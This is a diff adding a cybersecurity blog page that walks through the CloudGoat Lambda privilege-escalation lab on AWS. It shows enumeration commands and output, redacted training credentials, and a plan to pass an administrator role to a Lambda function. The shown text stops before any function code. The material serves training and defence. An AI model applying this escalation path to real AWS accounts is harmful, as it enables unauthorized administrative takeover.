@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CloudGoat Lambda Privilege Escalation WalkthroughThis walkthrough demonstrates a complete CloudGoat Lambda privilege escalation scenario using the powerful CloudTap enumeration tool. We’ll explore how">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cloudgoat-Lambda-Privesc">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="CloudGoat Lambda Privilege Escalation WalkthroughThis walkthrough demonstrates a complete CloudGoat Lambda privilege escalation scenario using the powerful CloudTap enumeration tool. We’ll explore how">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-05-26T01:18:40.000Z">
+<meta property="article:modified_time" content="2025-05-25T22:21:23.459Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="AWS">
+<meta property="article:tag" content="CloudGoat">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+        
+      
+    
+    <!-- title -->
+    <title>Cloudgoat-Lambda-Privesc</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/25/Cloudgoat-Iam-Privesc-by-Rollback/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&text=Cloudgoat-Lambda-Privesc"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&title=Cloudgoat-Lambda-Privesc"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&is_video=false&description=Cloudgoat-Lambda-Privesc"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cloudgoat-Lambda-Privesc&body=Check out this article: https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&title=Cloudgoat-Lambda-Privesc"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&title=Cloudgoat-Lambda-Privesc"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&title=Cloudgoat-Lambda-Privesc"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&title=Cloudgoat-Lambda-Privesc"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&name=Cloudgoat-Lambda-Privesc&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&t=Cloudgoat-Lambda-Privesc"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CloudGoat-Lambda-Privilege-Escalation-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">CloudGoat Lambda Privilege Escalation Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Setup"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Automated-Enumeration-with-CloudTap"><span class="toc-number">1.2.</span> <span class="toc-text">Automated Enumeration with CloudTap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-Permission-Discovery"><span class="toc-number">1.2.1.</span> <span class="toc-text">Initial Permission Discovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Role-Discovery-and-Auto-Assumption"><span class="toc-number">1.2.2.</span> <span class="toc-text">Role Discovery and Auto-Assumption</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Permission-Analysis"><span class="toc-number">1.3.</span> <span class="toc-text">Permission Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lambda-Manager-Role-Permissions"><span class="toc-number">1.3.1.</span> <span class="toc-text">Lambda Manager Role Permissions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Target-Role-Discovery"><span class="toc-number">1.3.2.</span> <span class="toc-text">Target Role Discovery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Strategy"><span class="toc-number">1.4.</span> <span class="toc-text">Privilege Escalation Strategy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lambda-Function-Creation-and-Exploitation"><span class="toc-number">1.5.</span> <span class="toc-text">Lambda Function Creation and Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-the-Malicious-Lambda-Function"><span class="toc-number">1.5.1.</span> <span class="toc-text">Creating the Malicious Lambda Function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Function-Execution"><span class="toc-number">1.5.2.</span> <span class="toc-text">Function Execution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Verification-of-Privilege-Escalation"><span class="toc-number">1.6.</span> <span class="toc-text">Verification of Privilege Escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#About-CloudTap"><span class="toc-number">1.7.</span> <span class="toc-text">About CloudTap</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Cloudgoat-Lambda-Privesc
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-26T01:18:40.000Z" class="dt-published" itemprop="datePublished">2025-05-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/AWS/" rel="tag">AWS</a>, <a class="p-category" href="/tags/CloudGoat/" rel="tag">CloudGoat</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="CloudGoat-Lambda-Privilege-Escalation-Walkthrough"><a href="#CloudGoat-Lambda-Privilege-Escalation-Walkthrough" class="headerlink" title="CloudGoat Lambda Privilege Escalation Walkthrough"></a>CloudGoat Lambda Privilege Escalation Walkthrough</h1><p>This walkthrough demonstrates a complete CloudGoat Lambda privilege escalation scenario using the powerful CloudTap enumeration tool. We’ll explore how an attacker can leverage Lambda functions and IAM role passing to escalate from limited permissions to full administrative access in an AWS environment. This CloudGoat lakthrew showcases a critical privilege escalation path that security professionals should understand and defend against.</p>
+<h2 id="Initial-Setup"><a href="#Initial-Setup" class="headerlink" title="Initial Setup"></a>Initial Setup</h2><p>First, configure CloudGoat to whitelist your IP address:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat config whitelist --auto</span><br></pre></td></tr></table></figure>
+
+<p>Create the Lambda privilege escalation scenario:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat create lambda_privesc</span><br></pre></td></tr></table></figure>
+
+<p>You’ll receive initial credentials:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">raynor_access_key_id = AKIAQ6VKGD5Y[REDACTED]</span><br><span class="line">raynor_secret_access_key = E4iMHEH4Zu3brER[REDACTED]</span><br></pre></td></tr></table></figure>
+
+<h2 id="Automated-Enumeration-with-CloudTap"><a href="#Automated-Enumeration-with-CloudTap" class="headerlink" title="Automated Enumeration with CloudTap"></a>Automated Enumeration with CloudTap</h2><p>For this walkthrough, we’ll use <a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a>, an excellent automation tool that streamlines the initial enumeration phase of AWS penetration testing. CloudTap automatically discovers permissions, roles, and potential privilege escalation paths, making it invaluable for security assessments.</p>
+<h3 id="Initial-Permission-Discovery"><a href="#Initial-Permission-Discovery" class="headerlink" title="Initial Permission Discovery"></a>Initial Permission Discovery</h3><p>CloudTap reveals the following attached policy:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Found attached policy<span class="punctuation">:</span> cg-chris-policy-cgid<span class="punctuation">[</span>REDACTED<span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;chris&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;sts:AssumeRole&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:List*&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:Get*&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Role-Discovery-and-Auto-Assumption"><a href="#Role-Discovery-and-Auto-Assumption" class="headerlink" title="Role Discovery and Auto-Assumption"></a>Role Discovery and Auto-Assumption</h3><p>CloudTap also identifies a potential role we can assume:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sts:AssumeRole&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::[ACCOUNT-ID]:user/chris-cgid[REDACTED]&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>One of CloudTap’s powerful features is its ability to automatically assume roles when the user has <code>AssumeRole</code> permissions. The tool provides temporary session credentials:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">📋 Temporary session credentials:</span><br><span class="line">   - AccessKeyId: ASIAQ6VKGD5Y[REDACTED]</span><br><span class="line">   - SecretAccessKey: NzeCDw9v7Vw5QT9E[REDACTED]</span><br><span class="line">   - SessionToken: FwoGZXIvYXdzEH4a[REDACTED]</span><br><span class="line">   - Expiration: 2025-05-25 22:01:09+00:00</span><br></pre></td></tr></table></figure>
+
+<h2 id="Permission-Analysis"><a href="#Permission-Analysis" class="headerlink" title="Permission Analysis"></a>Permission Analysis</h2><h3 id="Lambda-Manager-Role-Permissions"><a href="#Lambda-Manager-Role-Permissions" class="headerlink" title="Lambda Manager Role Permissions"></a>Lambda Manager Role Permissions</h3><p>Let’s examine what permissions our assumed role provides. First, get the policy ARN:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam list-attached-role-policies --role-name cg-lambdaManager-role-cgid[REDACTED] --profile init </span><br></pre></td></tr></table></figure>
+
+<p>Output:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;AttachedPolicies&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;PolicyName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cg-lambdaManager-policy-cgid[REDACTED]&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PolicyArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::[ACCOUNT-ID]:policy/cg-lambdaManager-policy-cgid[REDACTED]&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>Get the policy details:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam get-policy --policy-arn arn:aws:iam::[ACCOUNT-ID]:policy/cg-lambdaManager-policy-cgid[REDACTED] --profile init</span><br></pre></td></tr></table></figure>
+
+<p>Output:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Policy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;PolicyName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cg-lambdaManager-policy-cgid[REDACTED]&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;PolicyId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ANPAQ6VKGD5Y[REDACTED]&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::[ACCOUNT-ID]:policy/cg-lambdaManager-policy-cgid[REDACTED]&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;DefaultVersionId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;v1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachmentCount&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;PermissionsBoundaryUsageCount&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;IsAttachable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cg-lambdaManager-policy-cgid[REDACTED]&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-05-25T20:52:42+00:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;UpdateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-05-25T20:52:42+00:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Tags&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;Key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Name&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;Value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cg-lambdaManager-policy-cgid[REDACTED]&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;Key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Scenario&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;Value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lambda-privesc&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;Key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Stack&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;Value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CloudGoat&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>Finally, examine the policy permissions:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam get-policy-version --policy-arn arn:aws:iam::[ACCOUNT-ID]:policy/cg-lambdaManager-policy-cgid[REDACTED] --version-id v1 --profile init</span><br></pre></td></tr></table></figure>
+
+<p>Output:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;PolicyVersion&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Document&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="string">&quot;lambda:*&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="string">&quot;iam:PassRole&quot;</span></span><br><span class="line">                    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lambdaManager&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;VersionId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;v1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;IsDefaultVersion&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-05-25T20:52:42+00:00&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Critical Finding</strong>: We have full Lambda permissions (<code>lambda:*</code>) and <code>iam:PassRole</code> for all resources!</p>
+<h3 id="Target-Role-Discovery"><a href="#Target-Role-Discovery" class="headerlink" title="Target Role Discovery"></a>Target Role Discovery</h3><p>CloudTap’s comprehensive analysis reveals another role with full administrative permissions:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">🔍 Analyzing role <span class="string">&#x27;cg-debug-role-cgid[REDACTED]&#x27;</span> before assumption attempt...</span><br><span class="line">📋 Analyzing permissions <span class="keyword">for</span> role <span class="string">&#x27;cg-debug-role-cgid[REDACTED]&#x27;</span>...</span><br><span class="line">    Managed Policies: 1</span><br><span class="line">    Inline Policies: 0</span><br><span class="line">📄 Managed Policy: AdministratorAccess</span><br><span class="line">ARN: arn:aws:iam::aws:policy/AdministratorAccess</span><br><span class="line">Policy Versions:</span><br><span class="line">    Version v1 (DEFAULT) - Created: 2015-02-06 18:39:46+00:00</span><br><span class="line">    Default Version (v1) Permissions:</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Privilege-Escalation-Strategy"><a href="#Privilege-Escalation-Strategy" class="headerlink" title="Privilege Escalation Strategy"></a>Privilege Escalation Strategy</h2><p>Our escalation path is now clear:</p>
+<ol>
+<li>Create a Lambda function</li>
+<li>Use <code>iam:PassRole</code> to assign the <code>cg-debug-role-cgid[REDACTED]</code> role to the function</li>
+<li>The Lambda function will execute with administrator privileges</li>
+<li>Use the function to attach the AdministratorAccess policy to our user</li>
+</ol>
